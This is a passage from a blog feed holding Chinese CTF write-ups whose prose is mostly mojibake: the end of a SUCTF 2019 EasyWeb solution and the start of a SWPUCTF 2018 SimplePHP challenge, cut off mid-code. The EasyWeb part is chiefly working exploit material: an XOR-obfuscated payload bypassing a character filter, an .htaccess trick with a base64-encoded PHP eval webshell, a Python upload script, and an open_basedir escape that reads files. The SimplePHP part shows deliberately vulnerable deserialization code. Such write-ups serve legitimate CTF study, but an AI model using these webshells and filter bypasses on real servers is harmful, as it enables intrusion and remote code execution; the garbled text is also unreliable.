punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">94</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">,</span><span class="token number">137</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">139</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">141</span><span class="token punctuation">,</span><span class="token number">142</span><span class="token punctuation">,</span><span class="token number">143</span><span class="token punctuation">,</span><span class="token number">144</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">146</span><span class="token punctuation">,</span><span class="token number">147</span><span class="token punctuation">,</span><span class="token number">148</span><span class="token punctuation">,</span><span class="token number">149</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">151</span><span class="token punctuation">,</span><span class="token number">152</span><span class="token punctuation">,</span><span class="token number">153</span><span class="token punctuation">,</span><span class="token number">154</span><span class="token punctuation">,</span><span class="token number">155</span><span class="token punctuation">,</span><span class="token number">156</span><span class="token punctuation">,</span><span class="token number">157</span><span class="token punctuation">,</span><span class="token number">158</span><span class="token punctuation">,</span><span class="token number">159</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">161</span><span class="token punctuation">,</span><span class="token number">162</span><span class="token punctuation">,</span><span class="token number">163</span><span class="token punctuation">,</span><span class="token number">164</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">,</span><span class="token number">166</span><span class="token punctuation">,</span><span class="token number">167</span><span class="token punctuation">,</span><span class="token number">168</span><span class="token punctuation">,</span><span class="token number">169</span><span class="token punctuation">,</span><span class="token number">170</span><span class="token punctuation">,</span><span class="token number">171</span><span class="token punctuation">,</span><span class="token number">172</span><span class="token punctuation">,</span><span class="token number">173</span><span class="token punctuation">,</span><span class="token number">174</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">176</span><span class="token punctuation">,</span><span class="token number">177</span><span class="token punctuation">,</span><span class="token number">178</span><span class="token punctuation">,</span><span class="token number">179</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">181</span><span class="token punctuation">,</span><span class="token number">182</span><span class="token punctuation">,</span><span class="token number">183</span><span class="token punctuation">,</span><span class="token number">184</span><span class="token punctuation">,</span><span class="token number">185</span><span class="token punctuation">,</span><span class="token number">186</span><span class="token punctuation">,</span><span class="token number">187</span><span class="token punctuation">,</span><span class="token number">188</span><span class="token punctuation">,</span><span class="token number">189</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">191</span><span class="token punctuation">,</span><span class="token number">192</span><span class="token punctuation">,</span><span class="token number">193</span><span class="token punctuation">,</span><span class="token number">194</span><span class="token punctuation">,</span><span class="token number">195</span><span class="token punctuation">,</span><span class="token number">196</span><span class="token punctuation">,</span><span class="token number">197</span><span class="token punctuation">,</span><span class="token number">198</span><span class="token punctuation">,</span><span class="token number">199</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">202</span><span class="token punctuation">,</span><span class="token number">203</span><span class="token punctuation">,</span><span class="token number">204</span><span class="token punctuation">,</span><span class="token number">205</span><span class="token punctuation">,</span><span class="token number">206</span><span class="token punctuation">,</span><span class="token number">207</span><span class="token punctuation">,</span><span class="token number">208</span><span class="token punctuation">,</span><span class="token number">209</span><span class="token punctuation">,</span><span class="token number">210</span><span class="token punctuation">,</span><span class="token number">211</span><span class="token punctuation">,</span><span class="token number">212</span><span class="token punctuation">,</span><span class="token number">213</span><span class="token punctuation">,</span><span class="token number">214</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">216</span><span class="token punctuation">,</span><span class="token number">217</span><span class="token punctuation">,</span><span class="token number">218</span><span class="token punctuation">,</span><span class="token number">219</span><span class="token punctuation">,</span><span class="token number">220</span><span class="token punctuation">,</span><span class="token number">221</span><span class="token punctuation">,</span><span class="token number">222</span><span class="token punctuation">,</span><span class="token number">223</span><span class="token punctuation">,</span><span class="token number">224</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">226</span><span class="token punctuation">,</span><span class="token number">227</span><span class="token punctuation">,</span><span class="token number">228</span><span class="token punctuation">,</span><span class="token number">229</span><span class="token punctuation">,</span><span class="token number">230</span><span class="token punctuation">,</span><span class="token number">231</span><span class="token punctuation">,</span><span class="token number">232</span><span class="token punctuation">,</span><span class="token number">233</span><span class="token punctuation">,</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">236</span><span class="token punctuation">,</span><span class="token number">237</span><span class="token punctuation">,</span><span class="token number">238</span><span class="token punctuation">,</span><span class="token number">239</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">241</span><span class="token punctuation">,</span><span class="token number">242</span><span class="token punctuation">,</span><span class="token number">243</span><span class="token punctuation">,</span><span class="token number">244</span><span class="token punctuation">,</span><span class="token number">245</span><span class="token punctuation">,</span><span class="token number">246</span><span class="token punctuation">,</span><span class="token number">247</span><span class="token punctuation">,</span><span class="token number">248</span><span class="token punctuation">,</span><span class="token number">249</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">251</span><span class="token punctuation">,</span><span class="token number">252</span><span class="token punctuation">,</span><span class="token number">253</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>                    <span class="token keyword">echo</span> <span class="token string">'%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'^%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>                    <span class="token variable">$index</span><span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$index</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">finds</span><span class="token punctuation">(</span><span class="token string">"_GET"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre><code>?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=phpinfo</code></pre><p><img src="/2021/08/07/suctf-2019-easyweb/image-20210901205321199.png" alt="image-20210901205321199"></p><p>å¯ä»¥çœ‹è§phpinfoé¡µé¢ï¼Œç‰ˆæœ¬7.2ï¼Œç”±äºŽè¿™é‡Œå„ç§é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åªèƒ½ä»Žget_the_flag()å‡½æ•°ä¸‹æ‰‹äº†<br>å¯ä»¥çœ‹è§æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œå¯¹åŽç¼€åè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½ä¸Šä¼ æœ‰phçš„åŽç¼€æ–‡ä»¶ï¼Œphtmlï¼Œphpç­‰ä¹Ÿä¸èƒ½ä¸Šä¼ äº†ï¼Œ<br>å¯ä»¥è€ƒè™‘.htaccesså’Œ.user.iniï¼Œä¸è¿‡è¿™é‡Œ.user.iniå¥½åƒä¸è¡Œ<br>å¯¹å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½åŒ…å«&lt;?ï¼Œç”±äºŽè¿™é‡Œç‰ˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥<script language="php"></script>æ— æ³•ä½¿ç”¨<br>è¿™é‡Œçš„è§£å†³æ–¹æ³•æ˜¯å°†ä¸€å¥è¯è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åŽåœ¨.htaccessä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç <br>è¿˜æœ‰ä¸ªæ–‡ä»¶å¤´æ£€æµ‹ï¼Œå¥½åŠžï¼Œä¸€èˆ¬éƒ½ç”¨GIF89è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œä¼šå‡ºçŽ°é—®é¢˜ï¼Œ.htaccessæ–‡ä»¶ä¼šæ— æ³•ç”Ÿæ•ˆ<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨#define width 1337 #define height 1337è¿›è¡Œç»•è¿‡ï¼Œ#åœ¨.htaccessä¸­è¡¨ç¤ºæ³¨é‡Š<br>æ‰€ä»¥æˆ‘ä»¬çš„.htaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"</code></pre><p>shell.ahhh</p><pre><code>GIF89a12        #12æ˜¯ä¸ºäº†è¡¥è¶³8ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³base64ç¼–ç çš„è§„åˆ™PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==</code></pre><p>ä¸Šä¼ ç›‘æœ¬</p><pre class=" language-Python"><code class="language-Python">import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=get_the_flag"files = {'file':('.htaccess',htaccess,'image/jpeg')}data = {"upload":"Submit"}response = requests.post(url=url, data=data, files=files)print(response.text)files = {'file':('shell.ahhh',shell,'image/jpeg')}response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre><p>å¾—åˆ°è·¯å¾„</p><p><img src="/2021/08/07/suctf-2019-easyweb/image-20210903131131780.png" alt="image-20210903131131780"></p><p>è®¿é—®shell</p><pre><code>chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/THis_Is_tHe_F14g'));</code></pre><p>phpinfoé‡Œä¹Ÿæœ‰ç­”æ¡ˆ</p><p><img src="/2021/08/07/suctf-2019-easyweb/image-20210903180330393.png" alt="image-20210903180330393"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTFï¼š2018-SimplePHP</title>
      <link href="2021/08/06/swpuctf-2018-simplephp/"/>
      <url>2021/08/06/swpuctf-2018-simplephp/</url>
      
        <content type="html"><![CDATA[<p>file.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string">'function.php'</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre><p>function.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("ä¸Šä¼ æˆåŠŸ!");&lt;/script>'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//echo "&lt;h4>è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:" . "&lt;h4/>"; </span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre><p>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>       <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token 